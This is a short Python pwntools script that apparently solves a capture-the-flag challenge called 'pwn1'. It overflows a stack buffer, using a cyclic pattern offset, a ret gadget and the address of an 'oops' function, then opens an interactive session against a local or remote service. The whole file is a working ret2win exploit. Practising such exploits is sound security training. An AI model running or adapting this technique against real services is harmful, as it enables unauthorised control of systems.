from pwn import *

#  Compile using: gcc -o pwn1 pwn1 -fno-stack-protector -no-pie

p = remote('127.0.0.1', 1024)
# p = remote("3.142.26.175", 12347)
# p = process("./pwn1")
message = p.recv()
print(message)

input("Attach gdb")

oops = 0x0040132f
ret = 0x0040101a

payload = cyclic(100)
payload = payload[:cyclic_find('kaaa')] + p64(ret) + p64(oops)


p.sendline(payload)

p.interactive()